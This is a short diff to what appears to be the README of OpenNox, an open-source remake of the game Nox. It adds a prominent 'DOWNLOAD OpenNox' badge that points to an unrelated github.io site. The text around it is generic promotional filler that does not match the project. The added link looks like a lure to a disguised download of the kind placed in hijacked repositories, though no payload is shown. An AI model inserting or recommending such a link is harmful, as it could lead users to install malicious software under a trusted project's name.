@@ -30,6 +30,12 @@ OpenNox is an open-source reimplementation of the Nox (2000) action RPG, restori
 
 Whether you're a newcomer or a veteran, OpenNox provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download OpenNox](https://img.shields.io/badge/⬇_DOWNLOAD_OpenNox-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
